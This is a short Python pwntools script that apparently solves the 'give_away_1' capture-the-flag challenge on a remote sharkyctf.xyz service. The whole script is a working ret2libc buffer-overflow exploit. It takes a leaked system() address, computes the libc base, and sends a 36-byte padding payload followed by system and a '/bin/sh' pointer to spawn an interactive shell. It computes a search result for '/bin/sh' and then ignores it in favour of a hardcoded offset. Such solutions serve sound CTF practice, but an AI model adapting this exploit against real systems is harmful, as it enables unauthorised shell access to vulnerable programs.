from pwn import *

#p=process("./give_away_1")
#elf=ELF("./give_away_1")
#libc=elf.libc
p=remote("sharkyctf.xyz",20334)
libc=ELF("libc-2.27.so")
pause()
p.recvuntil("Give away: ")
system = int(p.recvline(),16)

libc.address = system - libc.symbols['system']
log.info("libc:"+hex(libc.address))
binsh_off=libc.search("/bin/sh\x00").next()
log.info("binsh:"+hex(binsh_off))
binsh = libc.address + 0x17e0cf
payload = 'A'*36
payload += p32(system)
payload += p32(0)
payload += p32(binsh)

p.sendline(payload)

p.interactive()